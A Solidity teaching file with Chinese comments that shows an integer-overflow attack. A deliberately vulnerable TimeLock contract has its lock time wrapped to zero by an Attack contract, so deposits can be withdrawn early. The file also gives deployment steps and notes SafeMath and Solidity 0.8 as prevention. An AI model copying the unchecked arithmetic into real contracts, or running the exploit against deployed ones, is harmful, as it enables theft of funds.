
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// 此合约旨在充当时间保险库。
// 用户可以存入该合约，但至少一周内不能提现。
// 用户也可以将等待时间延长到超过 1 周的等待期。

/*
1.部署时间锁
2.使用TimeLock地址部署攻击
3. 调用 Attack.attack 发送 1 个以太币。 您将立即能够
    取出你的以太币。

发生了什么？
攻击导致 TimeLock.lockTime 溢出并能够撤回
在 1 周的等待期之前。
*/

// 预防技术
// 使用 SafeMath 将防止算术上溢和下溢

// Solidity 0.8 默认为上溢/下溢抛出错误

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = 当前锁定时间，那么我们需要找到 x 使得
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}

